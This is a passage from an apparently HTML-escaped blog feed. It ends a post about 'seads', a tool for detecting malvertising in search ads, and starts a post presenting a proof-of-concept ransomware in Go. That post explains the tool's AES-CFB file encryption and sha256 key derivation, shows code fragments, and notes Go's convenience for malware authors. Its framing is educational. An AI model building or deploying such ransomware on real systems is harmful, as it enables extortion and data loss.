+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-836ee50f67fe81c4996660a3198d3e36-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+437
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/go-rod/rod"
+data-repo-id="github-836ee50f67fe81c4996660a3198d3e36"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;p&gt;As for notifications, I used the Shoutrrr Notification library, which provides seamless integration for notifications in Go applications. You can find more details about Shoutrrr on its &lt;a href="https://containrrr.dev/shoutrrr/v0.8/" target="_blank" rel="noreferrer"&gt;documentation site&lt;/a&gt; and GitHub repository:&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5" target="_blank" href="https://github.com/containrrr/shoutrrr" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/containrrr/shoutrrr"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+containrrr/shoutrrr
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+Notification library for gophers and their furry friends.
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+1480
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+86
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/containrrr/shoutrrr"
+data-repo-id="github-2ce6ab0ee4fbdeea10044dfc2aecfdc5"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;h2 class="relative group"&gt;Limitations
+&lt;div id="limitations" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#limitations" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Due to the nature of search engine ads work, a single search might not reveal all the ads. However, by using the &lt;code&gt;concurrency&lt;/code&gt; flag to increase the number of headless browsers working simultaneously - although it may slightly slow down detection - it will ensures a more comprehensive collection of ads.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s also worth mentioning that notifications sent have character limits, so messages exceeding this limit won&amp;rsquo;t be sent. I have encountered this issue while testing &lt;code&gt;seads&lt;/code&gt;, as many search engine ad links may be quite long due to tracking elements. To address this, one approach could be setting up separate config files for different campaigns and running &lt;code&gt;seads&lt;/code&gt; separately for each.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Closing remarks
+&lt;div id="closing-remarks" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#closing-remarks" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;In conclusion, &lt;code&gt;seads&lt;/code&gt; can detect malvertising campaigns in Google, Bing, DuckDuckGo and Yahoo ads by relying on concurrent headless browser pages, which will navigate to the search engines, and display the ads which were found. The tool can be automatically executed with &lt;code&gt;cron&lt;/code&gt;, Windows Scheduler or &lt;code&gt;launchd&lt;/code&gt;, and it can take screenshots of the ads and send notifications via email, Slack or Telegram.&lt;/p&gt;</description></item><item><title>Proof of concept of a ransomware in Go</title><link>/posts/poc-goransom/</link><pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate><guid>/posts/poc-goransom/</guid><description>
+&lt;h2 class="relative group"&gt;Introduction
+&lt;div id="introduction" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#introduction" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;This is a blog post about my last project:&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-07c9cbd23d95ee828b302c9814b8eb97" target="_blank" href="https://github.com/andpalmier/goransom" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/goransom"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-07c9cbd23d95ee828b302c9814b8eb97-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/goransom
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-07c9cbd23d95ee828b302c9814b8eb97-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+A proof of concept of a super simple ransomware written in Go
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-07c9cbd23d95ee828b302c9814b8eb97-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+9
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-07c9cbd23d95ee828b302c9814b8eb97-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+4
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/goransom"
+data-repo-id="github-07c9cbd23d95ee828b302c9814b8eb97"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;p&gt;which is a proof of concept for a simple ransomware written in Go. The purpose of the project is purely educational; I wanted to get a bit more familiar with the language and its patterns.&lt;/p&gt;
+&lt;p&gt;I am not responsible for the use you make of this tool. &lt;strong&gt;Do not use it on systems where you don&amp;rsquo;t have the permission of the owner&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Background
+&lt;div id="background" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#background" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Ransomware is a particular type of malware which encrypts the victim&amp;rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: &lt;a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack" target="_blank" rel="noreferrer"&gt;WannaCry&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/CryptoLocker" target="_blank" rel="noreferrer"&gt;CryptoLocker&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Locky" target="_blank" rel="noreferrer"&gt;Locky&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;While developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.&lt;/p&gt;
+&lt;p&gt;Go makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Technical details
+&lt;div id="technical-details" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#technical-details" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Being a proof of concept, &lt;code&gt;goransom&lt;/code&gt; won&amp;rsquo;t automatically start to encrypt the full hard drive. We don&amp;rsquo;t want to cause trouble here.&lt;/p&gt;
+&lt;p&gt;Instead, the program allows to specify in input the path of the target file or folder to encrypt. &lt;code&gt;goransom&lt;/code&gt; also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.&lt;/p&gt;
+&lt;p&gt;After the files are successfully encrypted, they will have a &lt;em&gt;.locked&lt;/em&gt; suffix in the filename. In order to get the original files back, the &lt;code&gt;-decrypt&lt;/code&gt; flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.&lt;/p&gt;
+&lt;h3 class="relative group"&gt;Key generation, encryption and decryption
+&lt;div id="key-generation-encryption-and-decryption" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#key-generation-encryption-and-decryption" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;goransom&lt;/code&gt; encrypts and decrypts the given files using &lt;a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noreferrer"&gt;AES block cipher&lt;/a&gt;, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the &lt;a href="https://golang.org/pkg/crypto/" target="_blank" rel="noreferrer"&gt;crypto package and its subdirectories&lt;/a&gt;.&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/aescfb.webp" alt="CFB picture" /&gt;
+&lt;figcaption&gt;Go makes THIS super easy! &lt;a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_%28CFB%29" target="_blank" rel="noreferrer"&gt;Pic from Wikipedia&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;Since AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-go" data-lang="go"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// given a secret returns the sha256 hash&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// used for encryption/decryption&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;DeriveKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;secret&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Sum256&lt;/span&gt;&lt;span class="p"&gt;([]&lt;/span&gt;&lt;span class="nb"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;secret&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The encryption function is called for every file which has to be encrypted; it reads the content of the file and use it as a plaintext for our cipher.&lt;/p&gt;
+&lt;p&gt;The initialization vector (IV) is used by many modes of operation to randomize the encryption and produce different ciphertexts when plaintext and key are the same. The security requirements of the IV are different from the ones of the key: the IV needs to be unique, but it does not need to be a secret. It is therefore quite common to include it at the beginning of the ciphertext.&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-go" data-lang="go"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// open the given file&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ReadFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
